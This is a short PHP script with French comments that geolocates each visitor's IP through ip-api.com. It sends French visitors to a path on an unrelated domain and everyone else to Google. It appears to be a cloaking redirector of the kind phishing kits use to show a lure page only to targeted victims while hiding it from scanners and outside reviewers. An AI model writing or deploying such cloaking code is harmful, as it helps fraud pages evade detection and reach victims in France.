<?php
// Fonction pour récupérer l'adresse IP du client
function get_client_ip(): string {
    $client  = $_SERVER['HTTP_CLIENT_IP'] ?? null;
    $forward = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? null;
    $remote  = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';

    if (filter_var($client, FILTER_VALIDATE_IP)) {
        return $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        return $forward;
    }

    return ($remote === '::1') ? '127.0.0.1' : $remote;
}

// Récupérer l'IP du client
$client_ip = get_client_ip();

// Effectuer une requête API pour récupérer la géolocalisation de l'IP
$geo_data = file_get_contents("http://ip-api.com/json/{$client_ip}");

if ($geo_data !== false) {
    $geo_info = json_decode($geo_data, true);

    // Vérifier si la géolocalisation a réussi et si le pays est la France
    if (isset($geo_info['countryCode']) && strtolower($geo_info['countryCode']) === 'fr') {
        // Redirection vers la page spécifique si l'IP est en France
        header('Location: https://odumashelters.com/joint/index.php');
        exit;
    } else {
        // Redirection vers Google si l'IP n'est pas en France
        header('Location: https://google.com/');
        exit;
    }
} else {
    // En cas d'erreur lors de la récupération de la géolocalisation, redirection vers une page d'erreur
    http_response_code(404);
    header('Location: https://y6.com');
    exit;
}
?>
